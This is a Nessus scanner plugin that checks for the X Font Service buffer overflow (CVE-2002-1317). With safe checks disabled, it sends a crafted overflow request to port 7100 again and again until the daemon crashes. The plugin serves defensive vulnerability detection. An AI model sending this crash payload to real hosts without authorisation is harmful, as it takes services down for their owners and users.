#
# (C) Tenable Network Security, Inc.
#

# It turns out the initial revision of this script would *not* crash
# all versions of the font service.

include("compat.inc");

if (description)
{
 script_id(11188);
 script_version("1.27");
 script_cvs_date("Date: 2018/09/10 11:37:04");

 script_cve_id("CVE-2002-1317");
 script_bugtraq_id(6241);
 script_xref(name:"CERT-CC", value:"CA-2002-34");

 script_name(english:"X Font Service Crafted XFS Query Remote Overflow");
 script_summary(english:"Crashes the remote XFS daemon");

 script_set_attribute(attribute:"synopsis", value:"The remote font service is affected by a buffer overflow.");
 script_set_attribute(attribute:"description", value:
"The remote X Font Service (xfs) is affected by a buffer overflow.

An attacker may use this flaw to gain shell access on the remote host
as 'root' or 'nobody'.");
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?01026fdd");
 script_set_attribute(attribute:"solution", value:
"Apply the appropriate vendor patch as referenced in CERT Advisory
CA-2002-34.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2002/11/26");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/12/04");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2018 and is owned by Tenable, Inc. or an Affiliate thereof.");
 script_family(english:"Gain a shell remotely");

 script_dependencie("os_fingerprint.nasl");
 script_require_ports(7100);

 exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("solaris.inc");

version = get_kb_item("Host/Solaris/Version");
if ( version && "5.10" >< version ) exit(0);

if ( version && ereg(pattern:"^5\.[89]", string:version) )
{
 if ( solaris_check_patch(release:"5.8_x86", arch:"intel", patch:"109863-03") >= 0 ||
      solaris_check_patch(release:"5.8", arch:"sparc", patch:"109862-03") >= 0 ||
      solaris_check_patch(release:"5.9", arch:"sparc", patch:"113923-02") >= 0 ||
      solaris_check_patch(release:"5.9_x86", arch:"intel", patch:"113924-02") >= 0)
	exit(0);

}

kb = known_service(port:7100);
if(kb && kb != "xfs")exit(0);


port = 7100;

if(safe_checks())
{
 if (report_paranoia < 2) audit(AUDIT_PARANOID);	# No FP
 if(get_port_state(port))
 {
  soc = open_sock_tcp(port);
  if(soc)
  {
   close(soc);
   report = string(
    "Note that Nessus has not tried to exploit the overflow because safe\n",
    "checks are enabled but instead has only determined that an X Font\n",
    "Service is running."
   );
   security_hole(port:port, extra:report);
  }
 }
 exit(0);
}


# Safe checks are disabled - let's be nasty.

req = string("B", raw_string(0x00, 0x02), crap(1024));

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 send(socket:soc, data:req);
 close(soc);

 # We might need to re-try the attack up to ten times

  for(i = 0 ; i < 10 ; i = i + 1)
  {
  soc = open_sock_tcp(port);
  if(soc)
  {
  send(socket:soc, data:req);
  close(soc);
  } else { security_hole(port); exit(0); }
 }
}
